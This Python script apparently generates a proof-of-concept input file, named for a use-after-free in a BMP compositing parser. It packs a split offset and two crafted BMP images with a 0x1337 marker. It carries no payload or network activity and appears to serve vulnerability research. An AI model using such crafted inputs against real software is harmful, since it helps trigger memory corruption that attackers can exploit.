import struct
import os

def make_bmp_24bit(width, height, xpels=0x1337, seed=0):
    channels = 3
    row_stride = (width * channels + 3) & ~3
    pixel_data_size = height * row_stride
    file_size = 54 + pixel_data_size

    header = bytearray(54)
    header[0:2] = b'BM'
    struct.pack_into('<I', header, 2, file_size)
    struct.pack_into('<I', header, 6, 0)
    struct.pack_into('<I', header, 10, 54)
    struct.pack_into('<I', header, 14, 40)
    struct.pack_into('<i', header, 18, width)
    struct.pack_into('<i', header, 22, height)
    struct.pack_into('<H', header, 26, 1)
    struct.pack_into('<H', header, 28, 24)
    struct.pack_into('<I', header, 30, 0)
    struct.pack_into('<I', header, 34, pixel_data_size)
    struct.pack_into('<I', header, 38, xpels)
    struct.pack_into('<I', header, 42, 0)
    struct.pack_into('<I', header, 46, 0)
    struct.pack_into('<I', header, 50, 0)

    pixels = bytearray(pixel_data_size)
    for y in range(height):
        for x in range(width):
            offset = y * row_stride + x * channels
            pixels[offset] = (x * 41 + y * 59 + seed) & 0xFF
            pixels[offset + 1] = (x * 83 + y * 107 + seed * 3) & 0xFF
            pixels[offset + 2] = (x * 127 + y * 31 + seed * 7) & 0xFF

    return bytes(header) + bytes(pixels)

# Use 3x3 BMP (different from the 4x4 we used before) with different pixel seed
bmp1 = make_bmp_24bit(3, 3, xpels=0x1337, seed=42)
bmp2 = make_bmp_24bit(3, 3, xpels=0x1337, seed=99)

split_offset = len(bmp1)
total_size = 4 + len(bmp1) + len(bmp2)
effective_split = split_offset % (total_size - 4)
assert effective_split >= 54
assert effective_split <= total_size - 54

poc = struct.pack('<I', split_offset) + bmp1 + bmp2

out_path = os.path.join(r"C:\Users\NEHITH\Documents\Project Fenrer\scratch", "uaf_bmp_compositing_poc_v2")
with open(out_path, 'wb') as f:
    f.write(poc)

print(f"PoC v2 written: {out_path} ({len(poc)} bytes)")
print(f"BMP size: {len(bmp1)}, split: {split_offset}, total: {total_size}")
